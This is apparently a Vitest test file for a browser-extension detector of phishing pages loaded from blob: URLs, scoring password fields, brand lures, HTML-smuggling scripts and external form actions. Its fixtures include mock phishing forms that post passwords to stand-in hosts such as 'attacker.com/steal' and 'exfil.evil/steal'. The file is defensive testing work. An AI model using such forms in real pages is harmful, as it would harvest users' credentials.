/**
 * packages/extension/dataegress/tests/blob_credential_detector.test.js
 *
 * Vitest unit tests for the blob: URL credential page detector.
 *
 * Testing approach:
 *   The detector exports its core logic functions so they can be tested
 *   against synthetic DOM structures created with jsdom (Vitest's default
 *   environment). No Chrome extension APIs needed for these unit tests.
 *
 * Run: npx vitest run  (from packages/extension/)
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import {
  countPasswordFields,
  checkBrandKeywords,
  checkNestedSmuggling,
  checkFormExfiltration,
  calculateRiskScore,
  disableCredentialFields,
  injectWarningBanner,
} from '../blob_credential_detector.js';

// ---------------------------------------------------------------------------
// DOM helpers — build synthetic blob: page HTML for each test
// ---------------------------------------------------------------------------

function setBody(html) {
  document.body.innerHTML = html;
}

function setTitle(title) {
  document.title = title;
}

function clearDOM() {
  document.body.innerHTML = '';
  document.title = '';
  // Remove any injected banners
  document.getElementById('phishops-blob-warning')?.remove();
}

// ---------------------------------------------------------------------------
// countPasswordFields()
// ---------------------------------------------------------------------------

describe('countPasswordFields', () => {
  beforeEach(clearDOM);

  it('returns 0 for a page with no password fields', () => {
    setBody('<form><input type="text" name="user"></form>');
    expect(countPasswordFields()).toBe(0);
  });

  it('returns 1 for a single password field', () => {
    setBody('<form><input type="password" name="pass"></form>');
    expect(countPasswordFields()).toBe(1);
  });

  it('returns 2 for a confirm-password pattern', () => {
    setBody(`
      <form>
        <input type="password" name="password">
        <input type="password" name="confirm_password">
      </form>
    `);
    expect(countPasswordFields()).toBe(2);
  });

  it('detects password fields without quotes around type attribute', () => {
    // Both quoted and unquoted attribute forms must be detected
    setBody('<input type=password name="p">');
    expect(countPasswordFields()).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// checkBrandKeywords()
// ---------------------------------------------------------------------------

describe('checkBrandKeywords', () => {
  beforeEach(clearDOM);
  afterEach(clearDOM);

  it('detects Microsoft in page title', () => {
    setTitle('Sign in to Microsoft');
    setBody('<h1>Welcome</h1>');
    const result = checkBrandKeywords();
    expect(result.matched).toBe(true);
    expect(result.matchedBrands.some(b => b.includes('microsoft'))).toBe(true);
  });

  it('detects Google in page body text', () => {
    setBody('<h1>Google Account Sign In</h1>');
    const result = checkBrandKeywords();
    expect(result.matched).toBe(true);
    expect(result.matchedBrands).toContain('google');
  });

  it('detects generic lure keywords', () => {
    setTitle('Action Required: Account Suspended');
    const result = checkBrandKeywords();
    expect(result.matched).toBe(true);
    expect(result.matchedBrands.some(b => b.includes('account suspended'))).toBe(true);
  });

  it('detects PayPal in label text', () => {
    setBody('<label>Log in to your PayPal account</label>');
    const result = checkBrandKeywords();
    expect(result.matched).toBe(true);
  });

  it('returns no match for a blank page', () => {
    const result = checkBrandKeywords();
    expect(result.matched).toBe(false);
    expect(result.matchedBrands).toHaveLength(0);
  });

  it('caps matchedBrands at 5 entries', () => {
    // Stuff page with many brand mentions
    setTitle('Microsoft Google Apple Amazon PayPal DocuSign LinkedIn Facebook');
    const result = checkBrandKeywords();
    expect(result.matchedBrands.length).toBeLessThanOrEqual(5);
  });
});

// ---------------------------------------------------------------------------
// checkNestedSmuggling()
// ---------------------------------------------------------------------------

describe('checkNestedSmuggling', () => {
  beforeEach(clearDOM);

  it('detects atob() in inline script tag', () => {
    setBody('<script>var x = atob("PHg+");</script>');
    const result = checkNestedSmuggling();
    expect(result.detected).toBe(true);
    expect(result.patternCount).toBe(1);
  });

  it('detects createObjectURL in inline script', () => {
    setBody('<script>URL.createObjectURL(blob);</script>');
    const result = checkNestedSmuggling();
    expect(result.detected).toBe(true);
  });

  it('detects new Blob() in inline script', () => {
    setBody('<script>const b = new Blob(["data"]);</script>');
    const result = checkNestedSmuggling();
    expect(result.detected).toBe(true);
  });

  it('counts each script tag once even if it has multiple patterns', () => {
    setBody(`<script>
      var d = atob("PHg+");
      var b = new Blob([d]);
      URL.createObjectURL(b);
    </script>`);
    const result = checkNestedSmuggling();
    expect(result.patternCount).toBe(1);  // One script tag, not three matches
  });

  it('counts multiple script tags separately', () => {
    setBody(`
      <script>atob("PHg+")</script>
      <script>new Blob(["x"])</script>
    `);
    const result = checkNestedSmuggling();
    expect(result.patternCount).toBe(2);
  });

  it('does not flag external script tags (src attribute)', () => {
    // Inline text is empty for external scripts — should not fire
    setBody('<script src="https://cdn.example.com/lib.js"></script>');
    const result = checkNestedSmuggling();
    expect(result.detected).toBe(false);
  });

  it('returns false for a page with no scripts', () => {
    setBody('<h1>No scripts here</h1>');
    const result = checkNestedSmuggling();
    expect(result.detected).toBe(false);
    expect(result.patternCount).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// checkFormExfiltration()
// ---------------------------------------------------------------------------

describe('checkFormExfiltration', () => {
  beforeEach(clearDOM);

  it('detects form action pointing to external https URL', () => {
    setBody('<form action="https://attacker.com/steal"><input type="password"></form>');
    const result = checkFormExfiltration();
    expect(result.detected).toBe(true);
    expect(result.externalActions[0]).toContain('attacker.com');
  });

  it('does not flag relative action path', () => {
    setBody('<form action="/login"><input type="password"></form>');
    const result = checkFormExfiltration();
    expect(result.detected).toBe(false);
  });

  it('does not flag form with no action', () => {
    setBody('<form><input type="password"></form>');
    const result = checkFormExfiltration();
    expect(result.detected).toBe(false);
  });

  it('caps externalActions at 3 entries', () => {
    setBody(`
      <form action="https://a.com/1"><input type=password></form>
      <form action="https://b.com/2"><input type=password></form>
      <form action="https://c.com/3"><input type=password></form>
      <form action="https://d.com/4"><input type=password></form>
    `);
    const result = checkFormExfiltration();
    expect(result.externalActions.length).toBeLessThanOrEqual(3);
  });
});

// ---------------------------------------------------------------------------
// calculateRiskScore()
// ---------------------------------------------------------------------------

describe('calculateRiskScore', () => {

  it('returns 0.0 when no signals are present', () => {
    const { riskScore, signalList } = calculateRiskScore({
      passwordFieldCount: 0,
      matchedBrands: [],
      nestedSmugglingDetected: false,
      nestedPatternCount: 0,
      formExfiltrationDetected: false,
      externalActions: [],
    });
    expect(riskScore).toBe(0.0);
    expect(signalList).toHaveLength(0);
  });

  it('scores 0.50 for a single password field alone', () => {
    const { riskScore } = calculateRiskScore({
      passwordFieldCount: 1,
      matchedBrands: [],
      nestedSmugglingDetected: false,
      nestedPatternCount: 0,
      formExfiltrationDetected: false,
      externalActions: [],
    });
    expect(riskScore).toBe(0.50);
  });

  it('credential_field + brand_impersonation = 0.70 → alert threshold met', () => {
    const { riskScore, signalList } = calculateRiskScore({
      passwordFieldCount: 1,
      matchedBrands: ['microsoft'],
      nestedSmugglingDetected: false,
      nestedPatternCount: 0,
      formExfiltrationDetected: false,
      externalActions: [],
    });
    expect(riskScore).toBe(0.70);
    expect(signalList.some(s => s.includes('credential_field'))).toBe(true);
    expect(signalList.some(s => s.includes('brand_impersonation'))).toBe(true);
  });

  it('full signal set caps at 1.0', () => {
    const { riskScore } = calculateRiskScore({
      passwordFieldCount: 2,          // 0.50 + 0.10
      matchedBrands: ['microsoft'],   // + 0.20
      nestedSmugglingDetected: true,  // + 0.20
      nestedPatternCount: 2,
      formExfiltrationDetected: true, // + 0.15
      externalActions: ['https://attacker.com/steal'],
    });
    // 0.50+0.10+0.20+0.20+0.15 = 1.15 → capped at 1.0
    expect(riskScore).toBe(1.0);
  });

  it('scores 0.90 for canonical high-risk page (1 pass + brand + form exfil)', () => {
    // Password(0.50) + brand(0.20) + nested(0.20) = 0.90 — above DISABLE_THRESHOLD
    const { riskScore } = calculateRiskScore({
      passwordFieldCount: 1,
      matchedBrands: ['microsoft'],
      nestedSmugglingDetected: true,
      nestedPatternCount: 1,
      formExfiltrationDetected: false,
      externalActions: [],
    });
    expect(riskScore).toBe(0.90);
  });

  it('signals list is populated correctly', () => {
    const { signalList } = calculateRiskScore({
      passwordFieldCount: 2,
      matchedBrands: ['paypal', 'google'],
      nestedSmugglingDetected: true,
      nestedPatternCount: 1,
      formExfiltrationDetected: true,
      externalActions: ['https://steal.ru/c'],
    });
    expect(signalList).toContain('multiple_credential_fields');
    expect(signalList.some(s => s.startsWith('brand_impersonation:'))).toBe(true);
    expect(signalList.some(s => s.startsWith('nested_smuggling:'))).toBe(true);
    expect(signalList.some(s => s.startsWith('external_form_action:'))).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// disableCredentialFields() + injectWarningBanner()
// ---------------------------------------------------------------------------

describe('disableCredentialFields', () => {
  beforeEach(clearDOM);
  afterEach(clearDOM);

  it('disables all password fields', () => {
    setBody(`
      <form>
        <input type="password" id="p1">
        <input type="password" id="p2">
      </form>
    `);
    disableCredentialFields(0.90);
    expect(document.getElementById('p1').disabled).toBe(true);
    expect(document.getElementById('p2').disabled).toBe(true);
  });

  it('sets warning placeholder text on disabled fields', () => {
    setBody('<input type="password" id="pass">');
    disableCredentialFields(0.85);
    expect(document.getElementById('pass').placeholder).toContain('Blocked');
  });

  it('injects warning banner into document', () => {
    setBody('<input type="password">');
    disableCredentialFields(0.90);
    expect(document.getElementById('phishops-blob-warning')).not.toBeNull();
  });
});

describe('injectWarningBanner', () => {
  beforeEach(clearDOM);
  afterEach(clearDOM);

  it('injects exactly one banner even if called twice (idempotent)', () => {
    injectWarningBanner(0.70);
    injectWarningBanner(0.70);
    const banners = document.querySelectorAll('#phishops-blob-warning');
    expect(banners.length).toBe(1);
  });

  it('banner contains risk score information', () => {
    injectWarningBanner(0.75);
    const banner = document.getElementById('phishops-blob-warning');
    expect(banner?.textContent).toContain('0.75');
  });

  it('banner has role="alert" for accessibility', () => {
    injectWarningBanner(0.70);
    const banner = document.getElementById('phishops-blob-warning');
    expect(banner?.getAttribute('role')).toBe('alert');
  });
});

// ---------------------------------------------------------------------------
// Integration: full detection pipeline on synthetic DOM
// ---------------------------------------------------------------------------

describe('full detection scenario', () => {
  beforeEach(clearDOM);
  afterEach(clearDOM);

  it('high-confidence phishing page: password + Microsoft brand + nested atob', () => {
    setTitle('Sign in to Microsoft');
    setBody(`
      <h1>Microsoft Account</h1>
      <form action="https://exfil.evil/steal">
        <input type="text" name="email">
        <input type="password" name="password">
      </form>
      <script>
        var staged = atob('PHNjcmlwdD4=');
        var b = new Blob([staged]);
        URL.createObjectURL(b);
      </script>
    `);

    const pwCount = countPasswordFields();
    const { matched, matchedBrands } = checkBrandKeywords();
    const { detected: nested } = checkNestedSmuggling();
    const { detected: exfil, externalActions } = checkFormExfiltration();

    const { riskScore, signalList } = calculateRiskScore({
      passwordFieldCount: pwCount,
      matchedBrands,
      nestedSmugglingDetected: nested,
      nestedPatternCount: 1,
      formExfiltrationDetected: exfil,
      externalActions,
    });

    // password(0.50) + brand(0.20) + nested(0.20) + form_exfil(0.15) = 1.05 → 1.0
    expect(riskScore).toBe(1.0);
    expect(signalList.length).toBeGreaterThanOrEqual(3);
    expect(matched).toBe(true);
    expect(nested).toBe(true);
    expect(exfil).toBe(true);
  });

  it('benign page with no credential fields stays clean', () => {
    setTitle('Company Blog — Latest News');
    setBody('<article><p>Welcome to our blog. <a href="#">Read more</a></p></article>');

    const pwCount = countPasswordFields();
    const { riskScore } = calculateRiskScore({
      passwordFieldCount: pwCount,
      matchedBrands: [],
      nestedSmugglingDetected: false,
      nestedPatternCount: 0,
      formExfiltrationDetected: false,
      externalActions: [],
    });

    expect(riskScore).toBe(0.0);
  });
});
